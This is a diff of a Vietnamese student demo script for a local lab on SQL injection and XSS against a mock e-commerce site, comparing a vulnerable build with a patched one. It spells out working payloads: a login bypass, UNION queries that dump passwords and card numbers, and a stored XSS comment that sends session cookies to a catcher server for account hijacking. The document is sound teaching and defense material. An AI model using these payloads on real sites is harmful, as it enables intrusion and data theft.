@@ -1,9 +1,18 @@
 # Kịch bản demo đề tài 3: SQL Injection và XSS trên web TMĐT giả lập
 
-Thời lượng dự kiến: 15 đến 20 phút. Mỗi lỗ hổng đi theo cùng một nhịp:
-**làm hết 3 màn tấn công ở bản lỗi (8080), rồi chạy lại đúng các payload đó ở bản vá (8081) để đối chứng.**
+Thời lượng dự kiến: khoảng 19 phút, chưa tính phần chuẩn bị. Kịch bản đi theo 4 bước của đề bài, cùng cấu trúc với chương 5 của báo cáo Word:
 
-Toàn bộ các bước dưới đây đã được chạy thử trên lab ngày 19/11/2026.
+| Bước | Nội dung | Thời lượng |
+|---|---|---|
+| 1. Lab setup | Dựng môi trường bằng Docker Compose, đưa CSDL về dữ liệu ban đầu | Làm trước buổi demo |
+| 2. Exploitation | Tấn công bản lỗi 8080: SQLi đăng nhập, SQLi UNION, XSS chiếm phiên | 12 phút |
+| 3. Defense & Mitigation | Giải thích và chỉ ra các biện pháp phòng thủ ở bản vá 8081 | 2 phút |
+| 4. Verification | Chạy lại đúng các payload trên 8081, chứng minh bị chặn | 3 phút |
+| Kết luận | Tổng kết, tính khả thi và bài học cho doanh nghiệp | 2 phút |
+
+Nhịp của cả buổi: làm hết 3 màn tấn công ở bản lỗi (8080), giải thích cách khắc phục, rồi chạy lại đúng các payload đó ở bản vá (8081) để đối chứng.
+
+Các bước chính (đăng nhập bypass, UNION, XSS chiếm phiên, đối chứng 8081) đã được chạy thử trên lab ngày 19/11/2026. Chưa kiểm chứng: hộp thoại `alert` của Reflected XSS trên Chrome thật (khi tập, nếu không hiện thì dùng payload dự phòng `<script>alert('XSS')</script>`) và script sqlmap tùy chọn.
 Riêng phần trả lời Q&A về đăng nhập, xem thêm `cach_trinh_bay_sql_injection.md`.
 
 ---
@@ -28,7 +37,7 @@ Hai loại XSS trong demo:
 
 ---
 
-## 1. Chuẩn bị trước buổi demo (làm trước 10 phút)
+## Bước 1. Thiết lập môi trường (Lab setup), làm trước buổi demo 10 phút
 
 1. Bật Docker Desktop, rồi khởi động lab kèm server hứng cookie (cổng 8888):
    ```powershell
@@ -51,13 +60,19 @@ Hai loại XSS trong demo:
 
 Tài khoản thật trong lab (để so sánh): `nguyenvana` / `pass123456`.
 
+Kiểm tra lab đã sẵn sàng: `docker compose ps` phải liệt kê đủ 4 container (`websec_mysql_db`, `websec_app_vulnerable`, `websec_app_secured`, `websec_cookie_stealer`) ở trạng thái Up, và mở được cả hai trang chủ.
+
 ---
 
-## 2. Màn 1: SQL Injection vượt qua đăng nhập (khoảng 4 phút)
+## Bước 2. Thực hiện tấn công (Exploitation), khoảng 12 phút
+
+Cả ba màn dưới đây thực hiện trên bản lỗi 8080. Phần đối chứng ở 8081 để dành cho bước 4, sau khi đã giải thích cách khắc phục ở bước 3.
+
+### Màn 1: SQL Injection vượt qua đăng nhập (khoảng 4 phút)
 
 **Câu dẫn:** "Trang đăng nhập kiểm tra tài khoản bằng một câu SQL. Nhóm em sẽ đăng nhập vào tài khoản admin mà không biết mật khẩu."
 
-### Tấn công ở 8080
+#### Tấn công ở 8080
 1. Vào `http://localhost:8080/login`.
 2. Ô tài khoản nhập: `admin' -- ` (có **dấu cách ở cuối**). Ô mật khẩu nhập bừa: `sai_mat_khau`.
 3. **Dừng lại, chỉ vào khung đen "Xem trước câu lệnh SQL"** ngay dưới form:
@@ -70,16 +85,14 @@ Tài khoản thật trong lab (để so sánh): `nguyenvana` / `pass123456`.
    - Điều kiện kiểm tra mật khẩu **biến mất**, câu SQL chỉ còn "lấy user tên admin".
 4. Bấm **Đăng nhập**. Kết quả: về trang chủ, banner đỏ "CA KIỂM THỬ SQL INJECTION THÀNH CÔNG", góc trên hiện **"Xin chào, Quản Trị Viên Hệ Thống (admin)"**.
 
-### Xem code lỗi
+#### Xem code lỗi
 `app-vulnerable/.../AppController.java`, hàm xử lý `POST /login`:
 ```java
 String sql = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
 ```
 "Dữ liệu người dùng được **cộng chuỗi** thẳng vào câu lệnh, nên CSDL không phân biệt được đâu là lệnh, đâu là dữ liệu."
 
----
-
-## 3. Màn 2: SQL Injection lấy trộm cả bảng tài khoản (khoảng 2 phút)
+### Màn 2: SQL Injection lấy trộm cả bảng tài khoản (khoảng 2 phút)
 
 **Câu dẫn:** "Vào được admin mới là một chuyện. Nguy hiểm hơn là đọc được toàn bộ dữ liệu, kể cả mật khẩu và thẻ tín dụng, chỉ qua ô tìm kiếm."
 
@@ -92,7 +105,7 @@ String sql = "SELECT * FROM users WHERE username = '" + username + "' AND passwo
 
 Mẹo: chép sẵn payload bước 2 ra Notepad rồi dán vào ô tìm kiếm. Chữ `zzz` ở đầu để không có sản phẩm thật nào khớp, kết quả chỉ còn dữ liệu bị trộm.
 
-### Chỉ dùng khi thầy hỏi thêm (không cần demo)
+#### Chỉ dùng khi thầy hỏi thêm (không cần demo)
 - **"Sao biết bảng tên users, cột tên password?"** "MySQL có sẵn CSDL hệ thống `information_schema`, giống như mục lục của mọi bảng và cột. Kẻ tấn công đọc mục lục đó qua chính lỗ SQLi trước." Nếu thầy muốn xem tận mắt, gõ:
   `zzz' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema=database() -- ` (hiện `users`, `products`, `comments`).
 - **"Sao lại là 4 cột (1, username, password, credit_card)?"** "UNION bắt buộc số cột bằng câu gốc. Câu gốc lấy 4 cột (id, name, description, price), kẻ tấn công dò bằng `' ORDER BY 4 -- ` (chạy được) và `' ORDER BY 5 -- ` (lỗi)."
@@ -104,9 +117,7 @@ Mẹo: chép sẵn payload bước 2 ra Notepad rồi dán vào ô tìm kiếm. 
 
 Code lỗi: `"... WHERE name LIKE '%" + keyword + "%'"`.
 
----
-
-## 4. Màn 3: XSS, chiếm tài khoản admin mà không cần mật khẩu (khoảng 6 phút, màn ấn tượng nhất)
+### Màn 3: XSS, chiếm tài khoản admin mà không cần mật khẩu (khoảng 6 phút, màn ấn tượng nhất)
 
 **Hai vai, hai cửa sổ (nói rõ với thầy ngay đầu màn):**
 
@@ -119,14 +130,14 @@ Code lỗi: `"... WHERE name LIKE '%" + keyword + "%'"`.
 
 **Câu dẫn:** "Hai màn trước tấn công **CSDL**. Giờ em chuyển sang **XSS**: kẻ tấn công làm cho **trình duyệt của nạn nhân** chạy JavaScript do chúng viết. Em chia 2 vai: cửa sổ ẩn danh là **hacker, không biết mật khẩu gì cả**; cửa sổ thường là **admin**."
 
-### Bước 1 [HACKER, cửa sổ ẩn danh]: Dò xem trang có chạy mã lạ không
+#### Thao tác 1 [HACKER, cửa sổ ẩn danh]: Dò xem trang có chạy mã lạ không
 1. Vào `localhost:8080/search`, gõ `<b>test</b>` → chữ **test** hiện in đậm.
    "Trang không mã hóa thứ em gõ, trình duyệt hiểu nó là HTML. Có khả năng bị XSS."
 2. Gõ tiếp `<script>alert(document.cookie)</script>` → **hộp thoại bật lên** (rỗng hoặc chỉ có cookie rác, vì hacker chưa đăng nhập).
    "Mã JavaScript đã chạy. Đây là payload chuẩn trong tài liệu OWASP để xác nhận lỗi. Mã nằm trong đường link nên gọi là **Reflected XSS**."
 3. "Nhưng mã chỉ chạy trên máy em, đọc cookie của chính em thì vô dụng. Hacker không ngồi vào máy admin để bấm F12 được. Phải làm sao cho **trình duyệt của admin tự chạy mã**."
 
-### Bước 2 [HACKER, cửa sổ ẩn danh]: Gửi bình luận chứa mã độc, không cần đăng nhập
+#### Thao tác 2 [HACKER, cửa sổ ẩn danh]: Gửi bình luận chứa mã độc, không cần đăng nhập
 1. Vào `localhost:8080/product?id=1`, gửi bình luận:
    ```html
    <script>new Image().src='http://localhost:8888/steal?cookie='+encodeURIComponent(document.cookie)</script>Sản phẩm rất tốt, 5 sao!
@@ -134,16 +145,16 @@ Code lỗi: `"... WHERE name LIKE '%" + keyword + "%'"`.
 2. Bình luận hiện tên "Khách hàng" và chỉ có dòng "Sản phẩm rất tốt, 5 sao!", **phần mã độc không thấy**.
    "Em không có tài khoản nào. Mã đã lưu vào CSDL, ai mở trang này cũng chạy nó, nên gọi là **Stored XSS**. Giờ hacker chỉ việc **chờ**."
 
-### Bước 3 [ADMIN, cửa sổ thường]: Admin làm việc bình thường
+#### Thao tác 3 [ADMIN, cửa sổ thường]: Admin làm việc bình thường
 1. "Bây giờ em đóng vai admin. Admin đăng nhập bằng **mật khẩu thật của mình**, như mọi ngày." Đăng nhập `admin` / `admin123_super_secret`.
 2. Admin vào xem `localhost:8080/product?id=1`. Không bấm gì thêm.
 
-### Bước 4 [HACKER, terminal]: Nhận token của admin
+#### Thao tác 4 [HACKER, terminal]: Nhận token của admin
 1. Chỉ sang terminal, dòng mới nhất có `session_token=...`.
    "Admin chỉ mở trang, trình duyệt admin đã tự gửi token về máy hacker. Hacker không hề biết mật khẩu."
 2. Copy đúng phần sau `session_token=` ở **dòng mới nhất** (bỏ qua `_ga`, `csrftoken`, `locale`: cookie của web khác trên localhost).
 
-### Bước 5 [HACKER, cửa sổ ẩn danh]: Dùng token vào tài khoản admin
+#### Thao tác 5 [HACKER, cửa sổ ẩn danh]: Dùng token vào tài khoản admin
 1. Ở cửa sổ ẩn danh (đang là "Khách vãng lai"): F12 → **Application** → **Cookies** → `http://localhost:8080` → nhấp đúp dòng trống: Name `session_token`, Value **dán chuỗi vừa copy** → F5.
    Cách khác qua Console: gõ tay `allow pasting` + Enter, rồi dán `document.cookie = "session_token=CHUỖI_VỪA_COPY; path=/"; location.reload();`
 2. Trang hiện **"Xin chào, Quản Trị Viên Hệ Thống (admin)"**.
@@ -170,7 +181,50 @@ Code lỗi (chỉ nói nếu thầy hỏi):
 
 ---
 
-## 5. Đối chứng ở bản vá 8081 (khoảng 4 phút, làm sau khi xong 3 màn 8080)
+## Bước 3. Triển khai giải pháp phòng thủ (Defense & Mitigation), khoảng 2 phút
+
+**Câu dẫn:** "Vừa rồi em khai thác được ba lỗ hổng trên bản 8080. Bản 8081 là bản đã vá: cùng giao diện, cùng cơ sở dữ liệu, chỉ khác cách viết mã. Em xin nói nhanh bốn biện pháp phòng thủ, gọi tên kỹ thuật và chỉ ra chỗ sửa."
+
+Cách trình bày: mở sẵn `AppController.java` của hai bản (đã chuẩn bị ở bước 1), mỗi kỹ thuật nói một đến hai câu. Nếu thầy chưa hỏi sâu thì chỉ cần nói tên kỹ thuật và vị trí trong bảng dưới.
+
+### Bốn biện pháp và vị trí trong mã
+
+| Lỗ hổng | Gốc rễ ở 8080 | Tên kỹ thuật khắc phục | Vai trò |
+|---|---|---|---|
+| SQLi | Cộng chuỗi vào câu SQL | **Parameterized Query / Prepared Statement** (truy vấn tham số hóa) | Chặn tận gốc |
+| XSS | In dữ liệu ra trang không mã hóa (`th:utext`) | **Output Encoding** (mã hóa đầu ra, `th:text`) | Chặn tận gốc |
+| XSS | JavaScript đọc được cookie phiên | **Cookie HttpOnly + SameSite** | Lớp phụ: lỡ còn XSS thì cookie vẫn không bị trộm |
+| XSS | Trình duyệt chạy mọi script | **CSP: Content Security Policy** | Lớp phụ: chặn script lạ và chặn gửi dữ liệu ra ngoài |
+
+Cả bộ gọi chung là **Defense in Depth (phòng thủ nhiều lớp)**: một lớp sơ hở thì lớp khác vẫn chặn. Hai kỹ thuật chính là khuyến nghị số 1 trong OWASP SQL Injection Prevention Cheat Sheet và OWASP XSS Prevention Cheat Sheet.
+
+**1. Parameterized Query (SQLi).** 8080: `"... WHERE username = '" + username + "' ..."`. 8081 (`app-secured/.../AppController.java:388-391`, tìm kiếm ở `:142-146`):
+```java
+String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
+pstmt.setString(1, username);
+pstmt.setString(2, password);
+// tìm kiếm: "... WHERE name LIKE ?" + pstmt.setString(1, "%" + keyword + "%");
+```
+"Gửi **khuôn lệnh** có chỗ trống `?` trước, CSDL chốt cứng cấu trúc; **dữ liệu** gửi sau chỉ là giá trị, không bao giờ được dịch thành lệnh. Gõ `admin' -- ` thì CSDL đi tìm user tên đúng nguyên văn `admin' -- `. Giống điền vào mẫu đơn in sẵn: viết gì vào ô Họ tên thì vẫn chỉ là họ tên." Mọi câu SQL ở 8081 (đăng nhập, tìm kiếm, xem sản phẩm, bình luận) đều dùng `?`.
+
+**2. Output Encoding (XSS).** 8080: `th:utext` (u = unescaped). 8081 (`search.html:187`, `product.html:351`): `th:text`.
+
+| Gõ vào | In ra HTML | Trình duyệt hiển thị |
+|---|---|---|
+| `<script>` | `&lt;script&gt;` | chữ `<script>` |
+| `<b>test</b>` | `&lt;b&gt;test&lt;/b&gt;` | chữ `<b>test</b>`, không in đậm |
+
+"Dữ liệu người dùng luôn được in ra dưới dạng **chữ**, không bao giờ thành **mã**."
+
+**3. Cookie HttpOnly + SameSite.** 8080: `cookie.setHttpOnly(false)`. 8081 (`application.properties:28-29`): `server.servlet.session.cookie.http-only=true`, `same-site=strict`. "HttpOnly: cookie vẫn gửi lên máy chủ, nhưng `document.cookie` không thấy. SameSite=Strict: trang web khác không làm trình duyệt gửi kèm cookie này được."
+
+**4. CSP.** 8081 (`SecurityHeadersFilter.java:24`) gắn vào mọi trang: `Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline';`. "Máy chủ ra lệnh cho trình duyệt: chỉ chạy script từ file của chính tôi. Script nhúng trong bình luận bị chặn, gửi dữ liệu sang `localhost:8888` cũng bị chặn." Filter còn gắn `X-Frame-Options: DENY` và `X-Content-Type-Options: nosniff`.
+
+**Câu chốt:** "Nguyên tắc chung là **không tin dữ liệu người dùng**: vào CSDL thì tách khỏi lệnh (Parameterized Query), ra trình duyệt thì mã hóa thành chữ (Output Encoding), và thêm nhiều lớp phòng thủ (HttpOnly, CSP)."
+
+---
+
+## Bước 4. Kiểm tra lại hiệu quả sau khi phòng thủ (Verification), khoảng 3 phút
 
 **Câu dẫn:** "Bây giờ em chạy lại **đúng các payload vừa rồi** trên bản đã vá ở cổng 8081. Giao diện giống hệt, CSDL dùng chung, chỉ khác cách viết code."
 
@@ -204,44 +258,12 @@ pstmt.setString(2, password);
 
 Đã kiểm chứng ngày 19/11/2026: login trả "không chính xác!", `'` và UNION trả "Không tìm thấy", `<b>test</b>` thành `&lt;b&gt;test&lt;/b&gt;`, header có CSP, cookie `SECUREDSESSION` có `HttpOnly; SameSite=Strict`.
 
-### Giải thích cách khắc phục (khi thầy hỏi "khắc phục cụ thể thế nào, gọi là gì")
-
-| Lỗ hổng | Gốc rễ ở 8080 | Tên kỹ thuật khắc phục | Vai trò |
-|---|---|---|---|
-| SQLi | Cộng chuỗi vào câu SQL | **Parameterized Query / Prepared Statement** (truy vấn tham số hóa) | Chặn tận gốc |
-| XSS | In dữ liệu ra trang không mã hóa (`th:utext`) | **Output Encoding** (mã hóa đầu ra, `th:text`) | Chặn tận gốc |
-| XSS | JavaScript đọc được cookie phiên | **Cookie HttpOnly + SameSite** | Lớp phụ: lỡ còn XSS thì cookie vẫn không bị trộm |
-| XSS | Trình duyệt chạy mọi script | **CSP: Content Security Policy** | Lớp phụ: chặn script lạ và chặn gửi dữ liệu ra ngoài |
-
-Cả bộ gọi chung là **Defense in Depth (phòng thủ nhiều lớp)**: một lớp sơ hở thì lớp khác vẫn chặn. Hai kỹ thuật chính là khuyến nghị số 1 trong OWASP SQL Injection Prevention Cheat Sheet và OWASP XSS Prevention Cheat Sheet.
-
-**1. Parameterized Query (SQLi).** 8080: `"... WHERE username = '" + username + "' ..."`. 8081 (`app-secured/.../AppController.java:388-391`, tìm kiếm ở `:142-146`):
-```java
-String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
-pstmt.setString(1, username);
-pstmt.setString(2, password);
-// tìm kiếm: "... WHERE name LIKE ?" + pstmt.setString(1, "%" + keyword + "%");
-```
-"Gửi **khuôn lệnh** có chỗ trống `?` trước, CSDL chốt cứng cấu trúc; **dữ liệu** gửi sau chỉ là giá trị, không bao giờ được dịch thành lệnh. Gõ `admin' -- ` thì CSDL đi tìm user tên đúng nguyên văn `admin' -- `. Giống điền vào mẫu đơn in sẵn: viết gì vào ô Họ tên thì vẫn chỉ là họ tên." Mọi câu SQL ở 8081 (đăng nhập, tìm kiếm, xem sản phẩm, bình luận) đều dùng `?`.
-
-**2. Output Encoding (XSS).** 8080: `th:utext` (u = unescaped). 8081 (`search.html:187`, `product.html:351`): `th:text`.
-| Gõ vào | In ra HTML | Trình duyệt hiển thị |
-|---|---|---|
-| `<script>` | `&lt;script&gt;` | chữ `<script>` |
-| `<b>test</b>` | `&lt;b&gt;test&lt;/b&gt;` | chữ `<b>test</b>`, không in đậm |
-
-"Dữ liệu người dùng luôn được in ra dưới dạng **chữ**, không bao giờ thành **mã**."
-
-**3. Cookie HttpOnly + SameSite.** 8080: `cookie.setHttpOnly(false)`. 8081 (`application.properties:28-29`): `server.servlet.session.cookie.http-only=true`, `same-site=strict`. "HttpOnly: cookie vẫn gửi lên máy chủ, nhưng `document.cookie` không thấy. SameSite=Strict: trang web khác không làm trình duyệt gửi kèm cookie này được."
-
-**4. CSP.** 8081 (`SecurityHeadersFilter.java:24`) gắn vào mọi trang: `Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline';`. "Máy chủ ra lệnh cho trình duyệt: chỉ chạy script từ file của chính tôi. Script nhúng trong bình luận bị chặn, gửi dữ liệu sang `localhost:8888` cũng bị chặn." Filter còn gắn `X-Frame-Options: DENY` và `X-Content-Type-Options: nosniff`.
-
-**Câu chốt:** "Nguyên tắc chung là **không tin dữ liệu người dùng**: vào CSDL thì tách khỏi lệnh (Parameterized Query), ra trình duyệt thì mã hóa thành chữ (Output Encoding), và thêm nhiều lớp phòng thủ (HttpOnly, CSP)."
+### Kiểm tra tự động (nói một câu)
+"Ngoài thao tác tay, mỗi bản có bộ kiểm thử JUnit riêng. Lần chạy `mvn test` ngày 19/11/2026: bản lỗi đạt 36/36 ca, khẳng định lỗ hổng vẫn khai thác được; bản vá đạt 39/39 ca, khẳng định cùng payload bị chặn."
 
 ---
 
-
-## 6. Kết bài (khoảng 1 phút): bảng tổng kết
+## Kết luận, khoảng 2 phút
 
 **Câu dẫn:** "Em xin tóm tắt lại những gì vừa demo."
 
@@ -256,19 +278,31 @@ pstmt.setString(2, password);
 2. **Hậu quả:** "Chỉ với vài ký tự, kẻ tấn công vào được tài khoản quản trị, lấy toàn bộ dữ liệu khách hàng, và chiếm phiên đăng nhập mà không cần mật khẩu. Với web TMĐT thật, đó là lộ thông tin thẻ, mất tiền và mất uy tín."
 3. **Cách vá đúng:** "**Tách dữ liệu khỏi lệnh**: Parameterized Query với SQL, Output Encoding với HTML. Thêm HttpOnly và CSP để phòng thủ nhiều lớp. Lọc ký tự hay chặn từ khóa (blacklist) chỉ là lớp phụ, vì luôn có cách lách."
 
+### Tính khả thi và bài học cho doanh nghiệp
+
+**Tính khả thi.** "Giải pháp này khả thi để doanh nghiệp áp dụng. Hai biện pháp chính có sẵn trong JDBC và Thymeleaf nên không cần mua thêm gì. Khối lượng sửa mã nhỏ: đổi nối chuỗi thành tham số `?`, đổi `th:utext` thành `th:text`, thêm vài dòng cấu hình cookie và một bộ lọc header. Chức năng giữ nguyên và kiểm chứng lại được bằng kiểm thử tự động."
+
+**Bài học cho doanh nghiệp:**
+- Không tin dữ liệu người dùng, cả khi đi vào CSDL lẫn khi đi ra trình duyệt.
+- Đưa quy ước "cấm nối chuỗi vào SQL, mã hóa đầu ra mặc định" vào hướng dẫn lập trình và kiểm tra khi đánh giá mã nguồn.
+- Phòng thủ nhiều lớp (HttpOnly, SameSite, CSP) để một lỗi sót không thành sự cố lớn.
+- Đưa payload SQLi và XSS vào kiểm thử tự động của quy trình phát triển (DevSecOps).
+
+Lưu ý khi nói: đánh giá này dựa trên lab nhỏ chạy cục bộ; với hệ thống thật cần đo thêm hiệu năng và rà soát toàn bộ câu truy vấn hiện có.
+
 **Câu kết:** "Nguyên tắc em rút ra là **không bao giờ tin dữ liệu người dùng nhập vào**. Đây cũng là lý do Injection, gồm cả SQLi và XSS, luôn nằm trong OWASP Top 10. Phần demo của em đến đây là hết, em cảm ơn thầy và mời thầy đặt câu hỏi."
 
 (Tùy chọn) Chạy công cụ tự động `exploits/sqli/run_sqlmap_demo.sh` để cho thấy kẻ tấn công thật không cần gõ tay. Cần cài sqlmap trước, và kịch bản này chưa được chạy thử.
 
 ---
 
-## 7. Sau buổi demo
+## Sau buổi demo
 ```powershell
 .\scripts\reset_db.ps1
 ```
 Lệnh này xóa bình luận độc hại để lần demo sau bắt đầu từ trạng thái sạch.
 
-## 8. Câu hỏi hay gặp (bổ sung cho file Q&A về SQLi)
+## Câu hỏi hay gặp (bổ sung cho file Q&A về SQLi)
 
 - **"Bản vá vẫn lưu mật khẩu dạng chữ thường?"** Đúng. Lab cố ý giữ như vậy để màn UNION cho thấy hậu quả rõ. Thực tế phải băm mật khẩu (bcrypt/Argon2). Nên ghi vào phần "Hạn chế và hướng phát triển" của báo cáo.
 - **"Có `HttpOnly` rồi thì còn cần `th:text` không?"** Có. `HttpOnly` chỉ giữ được cookie, còn XSS vẫn có thể sửa giao diện, giả form đăng nhập, hoặc gửi request thay người dùng. Mã hóa đầu ra mới chặn được tận gốc.
